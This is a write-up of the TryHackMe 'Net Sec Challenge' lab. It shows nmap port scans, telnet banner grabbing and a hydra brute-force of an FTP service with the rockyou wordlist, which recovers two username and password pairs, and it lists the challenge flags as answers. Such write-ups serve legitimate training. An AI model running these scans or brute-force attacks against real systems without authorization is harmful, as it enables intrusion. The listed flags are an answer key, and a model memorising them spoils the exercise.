# Try Hack Me - [Net Sec Challenge](https://tryhackme.com/room/netsecchallenge)
##### Practice the skills you have learned in the Network Security module.

## Task 1 - Introduction 

Use this challenge to test your mastery of the skills you have acquired in the Network Security module. All the questions in this challenge can be solved using only nmap , telnet , and hydra .
```
Launch the AttackBox and the target VM.
> No answer needed
```

## Task 2 - Challenge Questions 

```bash
sudo nmap -sS -v -Pn -p- 10.10.174.247

Discovered open port 22/tcp on 10.10.160.103
Discovered open port 80/tcp on 10.10.160.103
Discovered open port 8080/tcp on 10.10.160.103
Discovered open port 445/tcp on 10.10.160.103
Discovered open port 139/tcp on 10.10.160.103
Discovered open port 10021/tcp on 10.10.160.103
```

```bash
telnet 10.10.174.247 80
GET
Server: lighttpd THM{web_server_25352}
```

```bash
telnet 10.10.174.247 22
THM{946219583339}
```

```bash
ftp 10.10.174.247 10021
220 (vsFTPd 3.0.3)
```

```bash
cd /dev/shm
hydra -v -s 10021 -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.174.247 ftp
[10021][ftp] host: 10.10.174.247   login: eddie   password: jordan
[10021][ftp] host: 10.10.174.247   login: quinn   password: andrea

ftp 10.10.174.247 10021 # quinn:andrea
get ftp_flag.txt
exit
cat ftp_flag.txt
THM{321452667098}
```

```bash
sudo nmap -v -sN -p- 10.10.174.247
Exercise Complete! Task answer: THM{f7443f99}
```

You can answer the following questions using Nmap, Telnet, and Hydra.
```
What is the highest port number being open less than 10,000?
> 8080
```

```
There is an open port outside the common 1000 ports; it is above 10,000. What is it?
> 10021
```

```
How many TCP ports are open?
> 6
```

```
What is the flag hidden in the HTTP server header?
> THM{web_server_25352}
```

```
What is the flag hidden in the SSH server header?
> THM{946219583339}
```

```
We have an FTP server listening on a nonstandard port. What is the version of the FTP server?
> vsftpd 3.0.3
```

```
We learned two usernames using social engineering: eddie and quinn. What is the flag hidden in one of these two account files and accessible via FTP?
> THM{321452667098}
```

```
Browsing to http://MACHINE_IP:8080 displays a small challenge that will give you a flag once you solve it. What is the flag?
> THM{f7443f99}
```

## Task 3 - Summary 

Congratulations. In this module, we have learned about passive reconnaissance, active reconnaissance, Nmap, protocols and services, and attacking logins with Hydra.
```
Time to continue your journey with a new module.
> No answer needed
```

## Additional Resources